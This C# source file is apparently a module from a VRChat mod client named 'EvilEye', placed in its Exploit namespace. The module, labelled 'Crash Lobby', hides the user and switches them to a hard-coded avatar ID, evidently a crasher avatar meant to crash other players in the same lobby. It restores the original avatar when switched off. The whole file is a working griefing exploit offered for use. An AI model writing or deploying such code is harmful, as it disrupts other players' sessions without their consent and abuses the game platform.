using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using VRC.Core;
using EvilEye.SDK;
using EvilEye.Module;


namespace EvilEye.Module.Exploit
{
    class AssetBundleCrash : BaseModule
    {
        private string backupID;
        public AssetBundleCrash() : base("AssetBundleCrash", "Crash Lobby", Main.Instance.exploistButton, null, true) { }
        public override void OnDisable()
        {
            PlayerWrapper.ChangeAvatar(backupID);
            VRCPlayer.field_Internal_Static_VRCPlayer_0.SetHide(false);
        }

        public override void OnEnable()
        {
            backupID = APIUser.CurrentUser.avatarId;
            VRCPlayer.field_Internal_Static_VRCPlayer_0.SetHide(true);
            PlayerWrapper.ChangeAvatar("avtr_4335d043-643b-4309-8060-a03eb26238f9");
        }
    }
}
